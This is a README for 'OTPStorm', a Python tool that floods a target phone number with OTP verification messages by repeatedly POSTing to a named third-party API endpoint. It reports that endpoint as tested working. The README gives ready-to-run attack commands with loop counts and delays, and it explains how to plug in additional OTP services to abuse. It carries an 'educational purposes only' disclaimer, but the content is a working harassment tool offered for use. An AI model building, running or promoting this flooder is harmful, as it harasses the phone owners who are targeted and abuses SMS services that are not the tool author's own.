# ⚡ OTPStorm — OTP Flood Tool (ictfromabc)

<p align="center">
  <b>Clean · Single-Provider · Long-Term Support (LTS)</b>
</p>

OTPStorm sends OTP verification messages to a target phone number using the
**ictfromabc.com** API. Clean, structured, and easy to maintain.

> ⚠ **For educational purposes only.** Use only on numbers you own or have
> explicit permission to test. Misuse may violate applicable laws.

---

## ✨ Features

| Feature | Description |
|---|---|
| **1 Active Provider** | `ictfromabc` — POST to `https://ictfromabc.com/api/request-otp-v2/{phone}` |
| **CLI & Interactive** | Run with arguments or in interactive menu mode |
| **Loop Mode** | Automatically repeat attacks with configurable delay |
| **Countdown Timer** | Displays time until next attack cycle |
| **Config File** | JSON config file support (`otpstorm_config.json`) |
| **Logging** | File + console logging with levels (DEBUG, INFO, etc.) |

---

## 🚀 Quick Start

### Requirements
- Python **3.8+**
- `pip` (Python package installer)

### Install Dependencies

```bash
# On most systems:
pip install -r requirements.txt

# On Kali/Debian (PEP 668), use a virtual environment:
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

### Run

```bash
# Interactive mode (recommended)
python main.py

# Direct attack — single cycle
python main.py 0701515602

# Multiple cycles with delay
python main.py 0701515602 --loops 10 --delay 30

# Quiet mode (only summary)
python main.py 0701515602 --quiet

# List registered providers
python main.py --list-providers

# Run as installed package
python -m otpstorm 0701515602
```

### Install as a Package (optional)

```bash
pip install -e .
otpstorm 0701515602
```

---

## 🏗️ Project Structure

```
OTPStorm/
├── main.py                     # Entry point
├── otpstorm/                   # Main package
│   ├── __init__.py             # Package metadata
│   ├── __main__.py             # `python -m otpstorm` support
│   ├── cli.py                  # CLI argument parser & orchestration
│   ├── config.py               # Configuration management
│   ├── exceptions.py           # Custom exception hierarchy
│   ├── logger.py               # Colored logging setup
│   ├── utils.py                # Phone parsing, colors, animations
│   └── providers/              # OTP provider implementations
│       ├── __init__.py
│       ├── base.py             # Abstract base provider class
│       ├── registry.py         # Provider auto-registration system
│       └── ictfromabc.py       # ictfromabc.com OTP provider
├── requirements.txt            # Python dependencies
├── pyproject.toml              # Modern packaging config
├── setup.cfg                   # Legacy packaging config
└── .gitignore                  # Python standard ignores
```

---

## 📱 Provider

| Provider | Endpoint | Method |
|---|---|---|
| `ictfromabc` | `https://ictfromabc.com/api/request-otp-v2/{phone}` | POST |

Tested working (HTTP 200, `{"msg": "OTP sent successfully"}`).

---

## ⚙️ Configuration

Create `otpstorm_config.json` in the project directory:

```json
{
  "timeout": 15,
  "default_loops": 5,
  "inter_loop_delay": 60,
  "log_level": "INFO"
}
```

Environment variables also work:

| Variable | Config Key | Example |
|---|---|---|
| `OTPSTORM_TIMEOUT` | timeout | `10` |
| `OTPSTORM_LOOPS` | default_loops | `3` |
| `OTPSTORM_LOG_LEVEL` | log_level | `DEBUG` |

---

## 🧪 Adding a New Provider

1. Create a new file in `otpstorm/providers/` (e.g., `myprov.py`)
2. Subclass `BaseProvider` and use the `@register_provider` decorator:

```python
from otpstorm.providers.base import BaseProvider
from otpstorm.providers.registry import register_provider

@register_provider
class MyProvider(BaseProvider):
    name = "myprovider"
    description = "My Custom OTP Service"

    def send(self, nomor, b, c):
        response = self._make_request(
            "POST", "https://api.example.com/otp",
            data={"phone": nomor},
        )
        return {
            "success": response.ok,
            "status_code": response.status_code,
            "message": "OTP sent" if response.ok else "Failed",
            "response_text": self._truncate(response.text),
        }
```

3. Import it in `otpstorm/providers/__init__.py` to auto-register.

---

## 📜 License

This project is for **educational purposes only**. Use at your own risk.

Original Repository: [github.com/dew-coders](https://github.com/dew-coders)

---

<p align="center">
  Created with ❤️ by <b>Dew Coders</b>
</p>
